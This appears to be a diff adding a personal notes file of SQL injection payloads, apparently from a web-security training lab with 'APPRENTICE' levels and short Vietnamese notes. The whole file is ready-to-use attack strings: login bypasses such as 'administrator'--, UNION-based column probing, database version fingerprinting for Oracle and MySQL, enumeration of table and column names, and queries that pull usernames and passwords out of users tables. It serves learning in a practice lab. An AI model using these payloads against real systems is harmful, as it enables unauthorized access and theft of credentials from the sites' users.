@@ -1,0 +1,27 @@
+$Qp*K5g96ip=?@3YgH8+3rc}gD7d-!E5
+APPRENTICE 1: Chuyển category thành "' OR 1=1 --" 
+APPRENTICE 2: Đăng nhập với TK và MK là : "administrator'--"
+category='+UNION+SELECT+NULL,NULL,NULL--
+' UNION SELECT NULL,'W0Rwtl',NULL--
+
+'+UNION+SELECT+'asdad','asdasda'--
+'+UNION+SELECT+username,+password+FROM+users--
+
+category=%27union+select+null,null--
+category=%27union+select+null,'a'--
+category=%27union+select+null,concat(username,password)+from+users--
+
+category=%27union+select+banner,null+from+v$version--
+
+'+UNION+SELECT+@@version,+NULL#
+
+%27union+select+table_name,null+from+information_schema.tables--
+
+%27+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name=%27users_cjunrn%27--
+%27+UNION+SELECT+password_ppuhns,username_szujqy+FROM+users_cjunrn--
+
+'+UNION+SELECT+table_name,NULL+FROM+all_tables--
+
+%27+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name=%27USERS_KWUWTX%27--
+
+category=%27+UNION+SELECT+PASSWORD_INJPZA,USERNAME_QCKQOV+FROM+USERS_KWUWTX--
